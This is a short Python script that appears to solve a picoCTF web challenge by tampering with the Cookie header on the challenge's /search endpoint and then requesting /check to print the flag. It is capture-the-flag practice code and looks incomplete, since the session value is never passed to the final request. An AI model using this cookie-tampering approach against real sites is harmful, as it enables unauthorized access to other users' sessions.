import requests
from Cookies.split_function import *


##run /search request to get session value
url_search = "http://mercury.picoctf.net:27177/search"
Cookie_value = "1"
headers = {
    "Cookie": Cookie_value
}
response_search = requests.post(url_search, data={"name": "a"}, headers=headers)

res_redirect = response_search.history
spilit_part(res_redirect) ## return session value


##run /check request to get flag
url_check = "http://mercury.picoctf.net:27177/check"
response_check = requests.get(url_check)
print(response_check.content)